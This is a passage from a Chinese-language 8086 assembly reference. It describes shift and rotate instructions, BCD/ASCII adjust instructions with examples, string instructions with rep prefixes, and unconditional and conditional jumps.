\u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF sar \u6307\u4ee4\u683c\u5f0f \uff1asar dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u7b97\u6570\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF rol \u6307\u4ee4\u683c\u5f0f \uff1arol dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u5faa\u73af\u5de6\u79fb count \u4f4d\uff0c\u6700\u9ad8\u4f4d\u56de\u5230\u6700\u4f4e\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF ror \u6307\u4ee4\u683c\u5f0f \uff1aror dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u5faa\u73af\u53f3\u79fb count \u4f4d\uff0c\u6700\u4f4e\u4f4d\u56de\u5230\u6700\u9ad8\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF rcl \u6307\u4ee4\u683c\u5f0f \uff1arcl dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u5de6\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u5de6\u4fa7\u4e00\u8d77\u5faa\u73af\u5de6\u79fb \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF rcr \u6307\u4ee4\u683c\u5f0f \uff1arcr dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u53f3\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u53f3\u4fa7\u4e00\u8d77\u5faa\u73af\u53f3\u79fb \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF \u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4 \u00b6 BCD \u7801\u662f\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u5341\u8fdb\u5236\u6570\uff0c\u53ef\u4ee5\u5206\u4e3a\u538b\u7f29 BCD \u7801\u548c\u975e\u538b\u7f29 BCD \u7801 \u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4 \u00b6 \u538b\u7f29 BCD \u7801\u5373\u662f\u4f7f\u7528 4 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u5982 37h \u8868\u793a 37\u3002\u4e0e\u8fd9\u4e9b\u6307\u4ee4\u76f8\u5173\u7684\u662f af \u6807\u5fd7\uff0c\u5b83\u5728\u52a0\u51cf\u6cd5\u65f6\u5982\u679c\u4f4e\u56db\u4f4d\u548c\u9ad8\u56db\u4f4d\u95f4\u53d1\u751f\u4e86\u5341\u516d\u8fdb\u5236\u8fdb\u4f4d\u5219\u53d8\u4e3a 1\u3002\u56e0\u6b64\u4e5f\u4f1a\u6b63\u597d\u5dee 6\uff0cdaa das \u4f5c\u7528\u5219\u662f\u5c06\u8fd9\u4e2a 6 \u8c03\u6574\u56de\u6765\uff0c\u4f7f\u7ed3\u679c\u7ee7\u7eed\u4e3a\u538b\u7f29 BCD \u7801 daa \u6307\u4ee4\u683c\u5f0f \uff1adaa \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801 if (af == 1 || (al&0Fh) > 9) al += 6, af = 1; else af = 0 if (cf == 1 || al > 9Fh) al += 60h, cf = 1; else cf = 0 OF DF IF TF SF ZF AF PF CF das \u6307\u4ee4\u683c\u5f0f \uff1adas \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801 if (af == 1 || (al&0Fh) > 9) al -= 6, af = 1; else af = 0 if (cf == 1 || al > 9Fh) al -= 60h, cf = 1; else cf = 0 OF DF IF TF SF ZF AF PF CF \u975e\u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4 \u00b6 \u975e\u538b\u7f29 BCD \u7801\u4f7f\u7528 8 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u4f4d\uff0c\u5176\u4e2d\u9ad8 4 \u4f4d\u6ca1\u6709\u610f\u4e49\uff0c\u6bd4\u5982 06h 16h 26h \u5747\u8868\u793a\u5341\u8fdb\u5236\u6570 6 aaa \u6307\u4ee4\u683c\u5f0f \uff1aaaa \u6307\u4ee4\u4f5c\u7528 \uff1a\u52a0\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801 if (af == 1 || (al&0Fh) > 9) al = (al+6)&0Fh, ah += 1, af = 1, cf = 1 else af = 0, cf = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ah , 0 mov al , ' 8 ' ; al = 38h add al , ' 9 ' ; al = 38h + 39h = 71h, af = 1, cf = 0 aaa ; ax = 0107h \u5373 17 mov ax , 0505 h ; 55 add al , 9 ; al = 0Eh, af = 0, cf = 0 aaa ; ax = 0604h \u5373 64 aas \u6307\u4ee4\u683c\u5f0f \uff1aaas \u6307\u4ee4\u4f5c\u7528 \uff1a\u51cf\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801 if (af == 1 || (af&0Fh) > 9) al = (al-6)&0Fh, ah -= 1, af = 1, cf = 1 else af = 0, cf = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ax , 0201 h ; 21 sub al , 9 ; al = 0F8h, af = 1, cf = 1 aas ; ax = 0102h \u5373 12 mov ax , 0335 h ; 35 sub al , 38 h ; (\u51cf 8) al = 0FDh, af = 1, cf = 1 aas ; ax = 0207h \u5373 27 aam \u6307\u4ee4\u683c\u5f0f \uff1aaam \u6307\u4ee4\u4f5c\u7528 \uff1a\u4e58\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u4e58\u6cd5\u540e\u5bf9\u5176\u505a\u8c03\u6574 ah = al / 10, al = al % 10 OF DF IF TF SF ZF AF PF CF \u4f8b mov al , 3 mov bl , 4 mul bl ; ax = 000Ch aam ; ax = 0102h \u5373 12 aad \u6307\u4ee4\u683c\u5f0f \uff1aaad \u6307\u4ee4\u4f5c\u7528 \uff1a\u9664\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 ax \u88ab\u505a\u9664\u6cd5 \u524d \u5bf9\u5176\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u9664\u6cd5\u7ed3\u679c\u4e3a BCD \u7801 al = ah * 10 + al, ah = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ax , 0105 h ; 15 mov cl , 4 aad ; ax = 000Fh div cl ; al = 03h, ah = 03h \u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4 \u00b6 \u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5206\u4e3a movs \u5b57\u7b26\u4e32\u4f20\u9001\u3001cmps \u5b57\u7b26\u4e32\u6bd4\u8f83\u3001scas \u5b57\u7b26\u4e32\u626b\u63cf\u3001stos \u5b58\u5165\u5b57\u7b26\u4e32\u3001lods \u4ece\u5b57\u7b26\u4e32\u53d6\u4e94\u79cd\uff0c\u5b83\u4eec\u90fd\u53ef\u4ee5\u63a5\u4e00\u4e2a\u6307\u4ee4\u524d\u7f00\u3002\u5982\u679c\u4e0d\u63a5\u524d\u7f00\uff0c\u5219\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u5982\u679c\u63a5\u524d\u7f00\uff0c\u5219\u91cd\u590d\u6267\u884c\u3002lods \u6307\u4ee4\u4e0d\u5e38\u7528\u524d\u7f00 \u524d\u7f00 rep \u4f5c\u7528 \uff1a\u628a\u540e\u9762\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u91cd\u590d cx \u6b21 \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e00\u822c\u4e0d\u63a5 cmps scas \u524d\u7f00 repe / repz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a \u524d\u7f00 repne / repnz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u4e0d\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a \u5b57\u7b26\u4e32\u4f20\u9001\u6307\u4ee4 \u00b6 movsb \u6307\u4ee4\u683c\u5f0f \uff1amovsb / rep movsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a movsw \u6307\u4ee4\u683c\u5f0f \uff1amovsw / rep movsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u4e3a\u5355\u4f4d\u4ece ds:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a movs \u6307\u4ee4\u683c\u5f0f \uff1a (rep) movs byte ptr es:[di], byte ptr seg:[si] (rep) movs word ptr es:[di], word ptr seg:[si] \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ee5\u5b57\u8282/\u5b57\u4e3a\u5355\u4f4d\u4ece seg:[si] \u4f20\u9001\u6570\u636e\u5230 es:[di]\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\uff0c\u5f53 seg \u4e3a ds \u65f6\u4e0e movsb/movsw \u7b49\u4ef7\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a \u5b57\u7b26\u4e32\u6bd4\u8f83\u6307\u4ee4 \u00b6 cmpsb \u6307\u4ee4\u683c\u5f0f \uff1acmpsb / repe cmpsb / repne cmpsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57\u8282 ds:[si] \u4e0e es:[di]\uff0c\u5373 byte ptr ds:[si] - byte ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF cmpsw \u6307\u4ee4\u683c\u5f0f \uff1acmpsw / repe cmpsw / repne cmpsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57 ds:[si] \u4e0e es:[di]\uff0c\u5373 word ptr ds:[si] - word ptr es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1asi di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF cmps \u6307\u4ee4\u683c\u5f0f \uff1a (repe/repne) cmps byte ptr seg:[si], byte ptr es:[di] (repe/repne) cmps word ptr seg:[si], word ptr es:[di] \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83\u5b57\u8282/\u5b57 seg:[si] \u4e0e es:[di]\uff0c\u5373\u5de6\u51cf\u53f3\u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u6807\u5fd7\u4f4d\uff0c\u5e76\u79fb\u52a8 si di \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si di \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002si di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF \u5b57\u7b26\u4e32\u626b\u63cf\u6307\u4ee4 \u00b6 scasb \u6307\u4ee4\u683c\u5f0f \uff1ascasb / repe scasb / repne scasb \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83 al \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 al - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF scasw \u6307\u4ee4\u683c\u5f0f \uff1ascasw / repe scasw / repne scasw \u6307\u4ee4\u4f5c\u7528 \uff1a\u6bd4\u8f83 ax \u4e0e es:[di]\uff0c\u5373\u8ba1\u7b97 ax - es:[di] \u4e22\u5f03\u7ed3\u679c\u4fdd\u7559\u7b26\u53f7\u4f4d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0d\u4f1a\u5f71\u54cd\u6807\u5fd7\u4f4d\u3002di \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a OF DF IF TF SF ZF AF PF CF \u5b58\u5165\u5b57\u7b26\u4e32\u6307\u4ee4 \u00b6 stosb \u6307\u4ee4\u683c\u5f0f \uff1astosb / rep stosb \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a\u5b57\u8282 al \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a stosw \u6307\u4ee4\u683c\u5f0f \uff1astosw / rep stosw \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a\u5b57 ax \u5b58\u5165 es:[di] \u4e2d\uff0c\u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a \u4ece\u5b57\u7b26\u4e32\u53d6\u6307\u4ee4 \u00b6 lodsb \u6307\u4ee4\u683c\u5f0f \uff1alodsb \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5b58\u5165 al\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a lodsw \u6307\u4ee4\u683c\u5f0f \uff1alodsw \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece ds:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u5b58\u5165 ax\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a lods \u6307\u4ee4\u683c\u5f0f \uff1a lods byte ptr seg:[si] lods word ptr seg:[si] \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece seg:[si] \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282/\u5b57\u5b58\u5165 al/ax\uff0c\u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1aseg \u53ef\u4ee5\u662f cs ds es ss \u4e2d\u4efb\u610f\u4e00\u4e2a\u3002si \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 si \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282/\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a \u63a7\u5236\u8f6c\u79fb\u6307\u4ee4 \u00b6 \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 jmp \u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u5373\u77ed\u8df3\u3001\u8fd1\u8df3\u3001\u8fdc\u8df3\uff0c\u5176\u64cd\u4f5c\u7801\u548c\u64cd\u4f5c\u6570\u5747\u4e0d\u540c jmp \u77ed\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest / jmp short dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u53ea\u80fd\u4e3a\u7acb\u5373\u6570\uff0c\u4e14\u76ee\u6807\u5730\u5740 dest \u4e0e\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728\u8303\u56f4 [-128, 127] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e24\u5b57\u8282\uff08EBxx\uff0c\u540e\u4e24\u4f4d\u4e3a\u8ddd\u79bb\uff09 jmp \u8fd1\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ip \u6307\u9488\u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u4e4b\u95f4\u8ddd\u79bb\u5728 [-32768, 32767] \u5185\u3002\u4f1a\u7f16\u7801\u4e3a\u4e09\u5b57\u8282 jmp \u8fdc\u8df3 \u6307\u4ee4\u683c\u5f0f \uff1ajmp dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 cs:ip \u8d4b\u503c\u4e3a dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1acs \u4e5f\u4f1a\u6539\u53d8\uff0cdest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740 \u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 j cc \u7c7b\u6307\u4ee4 \u6307\u4ee4\u683c\u5f0f \uff1aj cc dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0e\u6807\u5fd7\u4f4d\u6709\u5173\u7684\u6761\u4ef6 cc \u6210\u7acb\uff0c\u5219\u4ee4 ip \u7b49\u4e8e dest\uff0c\u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1a\u8fd9\u4e9b\u8df3\u8f6c\u90fd\u662f\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 \u6240\u6709\u6b64\u7c7b\u6307\u4ee4\u53ca\u6761\u4ef6 \u6307\u4ee4 \u610f\u4e49 \u6761\u4ef6 \u5907\u6ce8 jz \u7b49\u4e8e\u96f6\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e je jnz \u4e0d\u7b49\u4e8e\u96f6\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jne jc \u6709\u8fdb\u4f4d\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jb jnae jnc \u65e0\u8fdb\u4f4d\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnb jae js \u6709\u7b26\u53f7\u4f4d\u5219\u8df3 sf=1 jns \u65e0\u7b26\u53f7\u4f4d\u5219\u8df3 sf=0 jo \u6709\u6ea2\u51fa\u4f4d\u5219\u8df3 of=1 jno \u65e0\u6ea2\u51fa\u4f4d\u5219\u8df3 of=0 jp/jpe \u6709\u5947\u5076\u4f4d\u5219\u8df3 pf=1 jnp/jpo \u65e0\u5947\u5076\u4f4d\u5219\u8df3 pf=0 ja/jnbe \u65e0\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 cf=0 and zf=0 jae/jnb \u65e0\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=0 \u7b49\u4ef7\u4e8e jnc jb/jae \u65e0\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 cf=1 \u7b49\u4ef7\u4e8e jc jbe/jna \u65e0\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 cf=1 or zf=1 jg/jnle \u6709\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 sf=of and zf=0 jge/jnl \u6709\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 sf=of jl/jnge \u6709\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 sf!=of jle/jng \u6709\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 sf!=of or zf=1 je \u76f8\u7b49\u5219\u8df3 zf=1 \u7b49\u4ef7\u4e8e jz jne \u4e0d\u76f8\u7b49\u5219\u8df3 zf=0 \u7b49\u4ef7\u4e8e jnz jcxz \u6307\u4ee4\u683c\u5f0f \uff1ajcxz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c cx \u7b49\u4e8e\u96f6\u5219\u4ee4 ip \u7b49\u4e8e dest \u5373\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1a\u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 \u5faa\u73af\u6307\u4ee4 \u00b6 loop \u6307\u4ee4\u683c\u5f0f \uff1aloop dest \u6307\u4ee4\u4f5c\u7528 \uff1acx \u8868\u793a\u5faa\u73af\u6b21\u6570\uff0ccx \u5148\u51cf 1\uff0c\u5982\u679c cx \u4e0d\u4e3a 0 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest 